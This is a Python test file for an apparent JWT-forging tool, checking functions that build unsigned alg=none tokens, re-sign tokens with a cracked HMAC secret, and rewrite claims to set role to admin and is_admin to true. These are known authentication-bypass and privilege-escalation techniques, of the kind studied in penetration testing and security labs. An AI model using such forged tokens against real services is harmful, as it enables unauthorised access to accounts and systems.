"""JWT forging: alg=none, re-sign with cracked secret, claim elevation."""
import base64
import hashlib
import hmac
import json

from app import jwt_forge as jf


def _b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _hs256(header, payload, secret):
    h = _b64(json.dumps(header).encode())
    p = _b64(json.dumps(payload).encode())
    sig = _b64(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


def test_decode_parts():
    tok = _hs256({"alg": "HS256"}, {"sub": "1", "role": "user"}, "secret")
    head, payload = jf.decode_parts(tok)
    assert head["alg"] == "HS256" and payload["role"] == "user"
    assert jf.decode_parts("garbage") == (None, None)


def test_forge_none_is_unsigned():
    tok = jf.forge_none({"sub": "1"})
    assert tok.endswith(".")                      # empty signature
    head, _ = jf.decode_parts(tok + "x")          # decode tolerates
    assert head["alg"] == "none"


def test_forge_hs_validates_with_secret():
    head, payload = {"alg": "HS256"}, {"sub": "1", "role": "admin"}
    forged = jf.forge_hs(head, payload, "secret")
    # the forged token must verify under the same secret
    h, p, sig = forged.split(".")
    want = _b64(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest())
    assert sig == want


def test_elevate_overwrites_existing_role_claims():
    out = jf.elevate({"sub": "1", "role": "user", "is_admin": False})
    assert out["role"] == "admin" and out["is_admin"] is True
    assert out["sub"] == "1"


def test_elevate_adds_when_no_role_claim():
    out = jf.elevate({"sub": "1"})
    assert out["role"] == "admin" and out["is_admin"] is True


def test_forge_hs_respects_alg():
    forged = jf.forge_hs({"alg": "HS512"}, {"x": 1}, "k")
    h, p, sig = forged.split(".")
    want = base64.urlsafe_b64encode(
        hmac.new(b"k", f"{h}.{p}".encode(), hashlib.sha512).digest()).rstrip(b"=").decode()
    assert sig == want
